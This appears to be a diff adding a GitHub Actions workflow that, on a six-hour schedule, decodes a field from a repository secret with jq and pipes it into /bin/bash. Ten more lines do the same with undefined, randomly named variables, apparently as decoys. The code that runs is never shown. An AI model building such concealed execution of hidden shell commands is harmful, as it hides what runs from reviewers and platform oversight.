@@ -1,0 +1,27 @@
+name: jiangshidebeishang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangshidebeishang
+        env:
+          mmcww1: ${{ secrets.mmcww1 }}
+        run: |
+          echo $mmcww1 | jq -r .gdcz8075 | /bin/bash
+          echo $tmwmv07217 | jq -r .kjgvl677 | /bin/bash
+          echo $buxt9266 | jq -r .ukotg3386 | /bin/bash
+          echo $r47 | jq -r .qhbop267 | /bin/bash
+          echo $yr4262 | jq -r .eyktp53464 | /bin/bash
+          echo $qabsx0 | jq -r .sbo148 | /bin/bash
+          echo $hgve9149 | jq -r .a9 | /bin/bash
+          echo $bivjj45092 | jq -r .t95 | /bin/bash
+          echo $aauln729 | jq -r .qkyid0319 | /bin/bash
+          echo $s77143 | jq -r .d903 | /bin/bash
+          echo $aex4915 | jq -r .gpe87811 | /bin/bash
+
